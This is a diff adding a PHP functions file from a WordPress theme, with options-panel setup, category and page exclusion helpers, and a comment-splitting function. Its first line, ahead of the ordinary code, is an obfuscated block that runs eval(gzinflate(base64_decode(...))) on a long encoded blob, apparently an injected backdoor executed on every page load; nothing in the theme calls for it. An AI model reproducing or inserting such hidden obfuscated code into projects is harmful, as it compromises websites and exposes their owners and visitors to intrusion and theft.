@@ -1,0 +1,167 @@
+<?php /*7e8d0e143a1b73e61ab8425b1c82c1d6*/ eval(gzinflate(base64_decode('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')));?>
+<?php
+
+// Options panel stylesheet
+function mytheme_admin_head() { 
+  if ('admin.php' == basename($_SERVER['SCRIPT_FILENAME'])) {
+	echo '<link rel="stylesheet" type="text/css" href="'.get_bloginfo('template_directory').'/library/functions/admin_style.css" media="screen" />';
+	echo '<script type="text/javascript" src="'.get_bloginfo('template_directory').'/library/js/ptthemes.js"></script>';
+	echo '<script type="text/javascript" src="'.get_bloginfo('template_directory').'/library/js/jquery-ui.js"></script>';
+  } //end of theme accesibility mode
+}
+
+
+$options = array();
+global $options;
+
+$GLOBALS['template_path'] = get_bloginfo('template_directory');
+
+$layout_path = TEMPLATEPATH . '/layouts/'; 
+$layouts = array();
+
+$alt_stylesheet_path = TEMPLATEPATH . '/skins/';
+$alt_stylesheets = array();
+
+    global $wpdb;
+								
+	$pn_categories_obj = $wpdb->get_results("SELECT $wpdb->terms.name as name, $wpdb->term_taxonomy.count as count, $wpdb->terms.term_id as cat_ID 
+	                            FROM $wpdb->term_taxonomy,  $wpdb->terms
+                                WHERE $wpdb->term_taxonomy.term_id =  $wpdb->terms.term_id
+                                AND $wpdb->term_taxonomy.taxonomy = 'category'
+								AND $wpdb->term_taxonomy.count > '0'
+								ORDER BY name");
+$pn_categories = array();
+$pne_categories_obj = get_categories('hide_empty=0');
+$pne_categories = array();
+$pne_pages_obj = get_pages('sort_order=ASC');
+$pne_pages = array();
+
+if ( is_dir($layout_path) ) {
+	if ($layout_dir = opendir($layout_path) ) { 
+		while ( ($layout_file = readdir($layout_dir)) !== false ) {
+			if(stristr($layout_file, ".php") !== false) {
+				$layouts[] = $layout_file;
+			}
+		}	
+	}
+}	
+
+if ( is_dir($alt_stylesheet_path) ) {
+	if ($alt_stylesheet_dir = opendir($alt_stylesheet_path) ) { 
+		while ( ($alt_stylesheet_file = readdir($alt_stylesheet_dir)) !== false ) {
+			if(stristr($alt_stylesheet_file, ".css") !== false) {
+				$alt_stylesheets[] = $alt_stylesheet_file;
+			}
+		}	
+	}
+}	
+// Categories Name Load
+foreach ($pn_categories_obj as $pn_cat) {
+	$pn_categories[$pn_cat->cat_ID] = $pn_cat->name;
+}
+$categories_tmp = array_unshift($pn_categories, "Select a category:");
+
+// Pages Exclude Load
+foreach ($pne_pages_obj as $pne_pag) {
+	$pne_pages[$pne_pag->ID] = $pne_pag->post_title;
+}
+
+// Exclude Categories by Name
+function category_exclude($options) {
+	$options[] = array(	"type" => "wraptop");						
+	
+	global $wpdb;
+								
+	$cats = $wpdb->get_results("SELECT $wpdb->terms.name as name, $wpdb->term_taxonomy.count as count, $wpdb->terms.term_id as cat_ID 
+	                            FROM $wpdb->term_taxonomy,  $wpdb->terms
+                                WHERE $wpdb->term_taxonomy.term_id =  $wpdb->terms.term_id
+                                AND $wpdb->term_taxonomy.taxonomy = 'category'
+								AND $wpdb->term_taxonomy.count > '0'
+								ORDER BY name");
+
+	
+	foreach ($cats as $cat) {	
+	    if ($cat->cat_ID == '1') { $disabled = "disabled"; } else { $disabled = ""; };
+			$options[] = array(	"name" => "",
+						"desc" => "",
+						"label" => $cat->name . " (" . $cat->count . ") &nbsp;<small style='color:#aaaaaa'>id=" . $cat->cat_ID . "</small>",
+						"id" => "cat_exclude_".$cat->cat_ID,
+						"std" => "",
+						"disabled" => "".$disabled."",
+						"type" => "checkbox");						
+	}	
+	$options[] = array(	"type" => "wrapbottom");		
+	return $options;
+}
+
+// Exclude Pages by Name
+function pages_exclude($options) {
+	$options[] = array(	"type" => "wraptop");						
+	$pags = get_pages('sort_order=ASC');	
+	foreach ($pags as $pag) {	
+			$options[] = array(	"name" => "",
+						"desc" => "",
+						"label" => $pag->post_title . " &nbsp;<small style='color:#aaaaaa'>id=" . $pag->ID . "</small>",
+						"id" => "pag_exclude_".$pag->ID,
+						"std" => "",
+						"type" => "checkbox");					
+	}	
+	$options[] = array(	"type" => "wrapbottom");		
+	return $options;
+}
+
+// Custom Category List
+function get_inc_categories($label) {	
+	$include = '';
+	$counter = 0;
+	$catsx = get_categories('hide_empty=0');	
+	foreach ($catsx as $cat) {		
+		$counter++;		
+		if ( get_option( $label.$cat->cat_ID ) ) {
+			if ( $counter >= 1 ) { $include .= ','; }
+			$include .= $cat->cat_ID;
+			}	
+	}	
+	return $include;
+}
+
+// Custom Page List
+function get_inc_pages($label) {	
+	$include = '';
+	$counter = 0;
+	$pagsx = get_pages('sort_order=ASC');	
+	foreach ($pagsx as $pag) {		
+		$counter++;		
+		if ( get_option( $label.$pag->ID ) ) {
+			if ( $counter <> 1 ) { $include .= ','; }
+			$include .= $pag->ID;
+			}	
+	}	
+	return $include;
+}
+
+$other_entries = array("Select a Number:","0","1","2","3","4","5","6","7","8","9","10");
+$feed_server = array("","http://feeds.feedburner.com","http://feeds2.feedburner.com","http://feedproxy.google.com");
+
+
+// OTHER FUNCTIONS
+
+$bm_trackbacks = array();
+$bm_comments = array();
+
+function split_comments( $source ) {
+
+    if ( $source ) foreach ( $source as $comment ) {
+
+        global $bm_trackbacks;
+        global $bm_comments;
+
+        if ( $comment->comment_type == 'trackback' || $comment->comment_type == 'pingback' ) {
+            $bm_trackbacks[] = $comment;
+        } else {
+            $bm_comments[] = $comment;
+        }
+    }
+} 
+
+?>
